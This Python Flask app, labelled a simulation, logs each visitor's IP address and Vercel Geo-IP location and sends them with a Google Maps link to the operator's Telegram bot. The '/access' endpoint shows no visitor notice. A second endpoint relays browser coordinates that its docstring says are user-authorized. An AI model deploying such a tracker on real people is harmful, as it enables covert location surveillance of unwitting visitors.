from flask import Flask, request, jsonify, render_template
from datetime import datetime, timezone
import uuid
import os

import requests


app = Flask(__name__)


# Variáveis configuradas no Vercel
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")


@app.get("/")
def home():
    return render_template("index.html")


@app.post("/access")
def access():
    """
    Registra o acesso utilizando os dados de Geo-IP
    disponibilizados pela infraestrutura da Vercel.

    A localização obtida por IP é aproximada.
    """

    # IP público do visitante
    ip = request.headers.get("x-forwarded-for")

    if ip:
        # Pode existir mais de um IP no header.
        # O primeiro normalmente representa o cliente.
        ip = ip.split(",")[0].strip()

    # Dados de Geo-IP fornecidos pela Vercel
    country = request.headers.get("x-vercel-ip-country")
    region = request.headers.get("x-vercel-ip-country-region")
    city = request.headers.get("x-vercel-ip-city")
    latitude = request.headers.get("x-vercel-ip-latitude")
    longitude = request.headers.get("x-vercel-ip-longitude")
    timezone_name = request.headers.get("x-vercel-ip-timezone")

    # Identificador da solicitação
    record_id = str(uuid.uuid4())

    received_at = datetime.now(timezone.utc).isoformat()

    # Gera o link aproximado para o Google Maps
    maps_url = None

    if latitude and longitude:
        maps_url = (
            f"https://www.google.com/maps"
            f"?q={latitude},{longitude}"
        )

    # Envia os dados do Geo-IP para o Telegram
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:

        telegram_url = (
            f"https://api.telegram.org/"
            f"bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        )

        message = (
            "🌐 Acesso registrado — SIMULAÇÃO\n\n"
            f"ID: {record_id}\n"
            f"Recebido em: {received_at}\n\n"
            "🌐 GEO-IP — LOCALIZAÇÃO APROXIMADA\n"
            f"IP: {ip or 'indisponível'}\n"
            f"País: {country or 'indisponível'}\n"
            f"Região: {region or 'indisponível'}\n"
            f"Cidade: {city or 'indisponível'}\n"
            f"Latitude aproximada: {latitude or 'indisponível'}\n"
            f"Longitude aproximada: {longitude or 'indisponível'}\n"
            f"Fuso horário: {timezone_name or 'indisponível'}\n"
        )

        if maps_url:
            message += (
                "\n🗺️ Abrir localização aproximada no Google Maps:\n"
                f"{maps_url}"
            )

        try:
            response = requests.post(
                telegram_url,
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": message
                },
                timeout=10
            )

            response.raise_for_status()

        except requests.RequestException as error:
            print(
                f"Erro ao enviar acesso para o Telegram: {error}"
            )

    return jsonify({
        "ok": True,
        "id": record_id,
        "ip": ip,
        "country": country,
        "region": region,
        "city": city,
        "latitude": latitude,
        "longitude": longitude,
        "maps_url": maps_url
    })


@app.post("/location")
def location():
    """
    Recebe a localização obtida pelo navegador
    após autorização explícita do usuário.
    """

    data = request.get_json(force=True)

    latitude = data.get("latitude")
    longitude = data.get("longitude")
    accuracy = data.get("accuracy_m")

    # Gera o link direto para o Google Maps
    maps_url = None

    if latitude is not None and longitude is not None:
        maps_url = (
            f"https://www.google.com/maps"
            f"?q={latitude},{longitude}"
        )

    # Identificador da solicitação
    record_id = str(uuid.uuid4())

    received_at = datetime.now(timezone.utc).isoformat()

    # Envia a localização autorizada para o Telegram
    if (
        latitude is not None
        and longitude is not None
        and TELEGRAM_BOT_TOKEN
        and TELEGRAM_CHAT_ID
    ):
        telegram_url = (
            f"https://api.telegram.org/"
            f"bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        )

        message = (
            "📍 Localização recebida — SIMULAÇÃO\n\n"
            f"ID: {record_id}\n"
            f"Recebido em: {received_at}\n\n"
            f"Latitude: {latitude}\n"
            f"Longitude: {longitude}\n"
            f"Precisão: {accuracy} m\n\n"
            f"🗺️ Abrir no Google Maps:\n"
            f"{maps_url}"
        )

        try:
            response = requests.post(
                telegram_url,
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": message
                },
                timeout=10
            )

            response.raise_for_status()

        except requests.RequestException as error:
            print(
                f"Erro ao enviar localização para o Telegram: {error}"
            )

            return jsonify({
                "ok": False,
                "error": "Falha ao enviar localização para o Telegram."
            }), 502

    return jsonify({
        "ok": True,
        "id": record_id,
        "maps_url": maps_url
    })


if __name__ == "__main__":
    app.run(
        host="127.0.0.1",
        port=8000,
        debug=False
    )